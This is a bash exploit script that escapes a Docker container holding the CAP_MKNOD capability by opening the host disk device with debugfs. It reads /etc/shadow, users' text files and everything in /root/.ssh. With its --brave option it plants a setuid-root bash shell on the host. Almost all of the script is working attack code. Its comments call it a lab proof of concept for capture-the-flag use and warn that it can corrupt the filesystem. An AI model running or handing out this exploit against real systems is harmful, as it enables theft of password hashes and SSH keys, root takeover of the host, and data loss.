#!/usr/bin/env bash
#
# CAP_MKNOD_host.sh
#
# Capabilities:
#   1) Reading /home/*/*.txt, /root/*.txt, /root/.ssh/*.
#   2) Optionally (with --brave) creating a /tmp/suidbash that is root-owned and setuid root (mode 4755).
#      This yields root privileges to any unprivileged user on the host running docker.
#
# Usage:
#   ./CAP_MKNOD_host.sh <PROCESS_NAME> <DEVICE_NAME> [--brave]
#
# Example:
#   ./CAP_MKNOD_host.sh "sleep 600" "/HARDDISK"
#   ./CAP_MKNOD_host.sh "sleep 600" "/HARDDISK" --brave
#
# Disclaimer:
#   - The --brave flag will attempt to create a root-owned setuid shell via debugfs.
#   - Directly modifying inode fields on a live ext filesystem can cause disk corruption. (debugfs -w flag)

set -euo pipefail

# --------------------------------------------------------------------------------
# Helper: run_debugfs_cmd <command> <device> [write_mode=false]
# --------------------------------------------------------------------------------
run_debugfs_cmd() {
  local cmd="$1"
  local device_path="$2"
  local write_mode="${3:-false}"

  if [[ "$write_mode" == "true" ]]; then
    # -w for read/write mode
    debugfs -w -R "$cmd" "$device_path"
  else
    debugfs -R "$cmd" "$device_path"
  fi
}

# --------------------------------------------------------------------------------
# Helper: list_dir <directory> <device_path>
#   Runs `debugfs: ls -l <directory>` and returns a list of names (files/dirs/symlinks).
# --------------------------------------------------------------------------------
list_dir() {
  local dir_path="$1"
  local device_path="$2"

  local ls_out
  if ! ls_out="$(run_debugfs_cmd "ls -l $dir_path" "$device_path" false)"; then
    echo ""
    return
  fi

  echo "$ls_out" | awk '{print $NF}'
}

# --------------------------------------------------------------------------------
# Helper: cat_file <file_path> <device_path>
#   Equivalent of `debugfs: cat <file_path>`
# --------------------------------------------------------------------------------
cat_file() {
  local file_path="$1"
  local device_path="$2"
  run_debugfs_cmd "cat $file_path" "$device_path" false
}

# --------------------------------------------------------------------------------
# Parse arguments
# --------------------------------------------------------------------------------
if [[ $# -lt 2 ]]; then
  echo "Usage: $0 <PROCESS_NAME> <DEVICE_NAME> [--brave]"
  echo
  echo "Example: $0 \"sleep 600\" \"/HARDDISK\" --brave"
  exit 1
fi

PROCESS_NAME="$1"
DEVICE_NAME="$2"
DO_SUID="false"

if [[ $# -eq 3 && "$3" == "--brave" ]]; then
  DO_SUID="true"
fi

# --------------------------------------------------------------------------------
# 1) Find container process by name & user
# --------------------------------------------------------------------------------
echo "[*] Searching for container processes named '$PROCESS_NAME' owned by user '$USER'..."

HOST_PIDS="$(ps aux \
  | grep "$PROCESS_NAME" \
  | grep "$USER" \
  | grep -v grep \
  | awk '{print $2}' \
  || true)"

if [[ -z "$HOST_PIDS" ]]; then
  echo "[-] No matching processes found."
  exit 1
fi

echo "[+] Candidate PID(s): $HOST_PIDS"
echo

VALID_PIDS=()
for PID in $HOST_PIDS; do
  if [[ -e "/proc/$PID/root$DEVICE_NAME" ]]; then
    VALID_PIDS+=("$PID")
  fi
done

if [[ ${#VALID_PIDS[@]} -eq 0 ]]; then
  echo "[-] None of those PIDs have '$DEVICE_NAME' in /proc/<pid>/root."
  exit 1
fi

SELECTED_PID="${VALID_PIDS[0]}"
if [[ ${#VALID_PIDS[@]} -gt 1 ]]; then
  echo "[*] Multiple valid PIDs found with '$DEVICE_NAME': ${VALID_PIDS[*]}"
  echo "Select one PID to proceed:"
  read -r USER_SELECTED_PID
  if [[ " ${VALID_PIDS[@]} " =~ " ${USER_SELECTED_PID} " ]]; then
    SELECTED_PID="$USER_SELECTED_PID"
  else
    echo "[-] Invalid selection."
    exit 1
  fi
fi

echo "[+] Using HOST_PID=$SELECTED_PID"
ROOT_DEVICE_PATH="/proc/$SELECTED_PID/root$DEVICE_NAME"

# --------------------------------------------------------------------------------
# 2) Check debugfs read
# --------------------------------------------------------------------------------
echo
echo "[*] Checking if debugfs can read $ROOT_DEVICE_PATH..."
if ! run_debugfs_cmd "ls" "$ROOT_DEVICE_PATH" false &>/dev/null; then
  echo "[-] debugfs cannot read $ROOT_DEVICE_PATH. Possibly not ext2/3/4."
  exit 1
fi
echo "[+] debugfs read test succeeded."

# --------------------------------------------------------------------------------
# 3) Read /etc/shadow
# --------------------------------------------------------------------------------
echo
echo "============== Attempting to read /etc/shadow =============="
SHADOW_CONTENT="$(run_debugfs_cmd "cat /etc/shadow" "$ROOT_DEVICE_PATH" false || true)"
echo "$SHADOW_CONTENT"
echo "============================================================"

# --------------------------------------------------------------------------------
# 4) Read all *.txt in /home/*/ - aka flags hehe
# --------------------------------------------------------------------------------
echo
echo "[*] Reading all *.txt in /home/*/..."
HOME_DIRS=( $(list_dir "/home" "$ROOT_DEVICE_PATH") )
for user_dir in "${HOME_DIRS[@]}"; do
  [[ "$user_dir" == "." || "$user_dir" == ".." ]] && continue

  user_files=( $(list_dir "/home/$user_dir" "$ROOT_DEVICE_PATH") )
  for f in "${user_files[@]}"; do
    if [[ "$f" == *.txt ]]; then
      echo "----- /home/$user_dir/$f -----"
      cat_file "/home/$user_dir/$f" "$ROOT_DEVICE_PATH" || echo "[!] Could not read /home/$user_dir/$f"
      echo
    fi
  done
done

# --------------------------------------------------------------------------------
# 5) Read all *.txt in /root/ - aka flags hehe
# --------------------------------------------------------------------------------
echo
echo "[*] Reading all *.txt in /root/..."
ROOT_DIRS=( $(list_dir "/root" "$ROOT_DEVICE_PATH") )
for f in "${ROOT_DIRS[@]}"; do
  if [[ "$f" == *.txt ]]; then
    echo "----- /root/$f -----"
    cat_file "/root/$f" "$ROOT_DEVICE_PATH" || echo "[!] Could not read /root/$f"
    echo
  fi
done

# --------------------------------------------------------------------------------
# 6) Read all files in /root/.ssh/ 
# --------------------------------------------------------------------------------
echo
echo "[*] Reading all files in /root/.ssh/..."
SSH_DIR_FILES=( $(list_dir "/root/.ssh" "$ROOT_DEVICE_PATH") )
for f in "${SSH_DIR_FILES[@]}"; do
  echo "----- /root/.ssh/$f -----"
  cat_file "/root/.ssh/$f" "$ROOT_DEVICE_PATH" || echo "[!] Could not read /root/.ssh/$f"
  echo
done

# --------------------------------------------------------------------------------
# 7) If --brave, create root-owned setuid shell in /usr/bin/suidbash using debugfs
# --------------------------------------------------------------------------------
if [[ "$DO_SUID" == "true" ]]; then
  echo
  echo "[*] --brave specified. Creating a root-owned SUID shell in /usr/bin/suidbash..."
  echo "[!] WARNING: This will heavily fuck with the ext4 filesystem and can potentially"
  echo "    destroy the disk/OS if done in a real environment. Lab-only PoC."

  # We'll write the host's /usr/bin/bash into /usr/bin/suidbash
  # Make sure the container actually has /usr/bin/ available in that filesystem.
  # Also note that if /usr/bin doesn't exist or is read-only, this will fail.

  # 1) Write (copy) /usr/bin/bash -> /usr/bin/suidbash inside the target filesystem
  WRITE_CMD="write /usr/bin/bash /usr/bin/suidbash"
  run_debugfs_cmd "$WRITE_CMD" "$ROOT_DEVICE_PATH" true || {
    echo "[-] debugfs 'write' failed. Possibly read-only FS or no /usr/bin directory."
    exit 1
  }

  # 2) Force the inode fields: mode=0104755, uid=0, gid=0
  #    This is the non-interactive equivalent of running debugfs 'mi /usr/bin/suidbash'
  #    and manually setting fields.

  echo "[*] Setting /usr/bin/suidbash -> uid=0, gid=0, mode=0104755..."
  run_debugfs_cmd "set_inode_field /usr/bin/suidbash uid 0" "$ROOT_DEVICE_PATH" true || echo "[-] Failed to set uid=0"
  run_debugfs_cmd "set_inode_field /usr/bin/suidbash gid 0" "$ROOT_DEVICE_PATH" true || echo "[-] Failed to set gid=0"
  run_debugfs_cmd "set_inode_field /usr/bin/suidbash mode 0104755" "$ROOT_DEVICE_PATH" true || echo "[-] Failed to set mode=0104755"

  echo
  echo "[+] If successful, /usr/bin/suidbash is now SUID."
fi
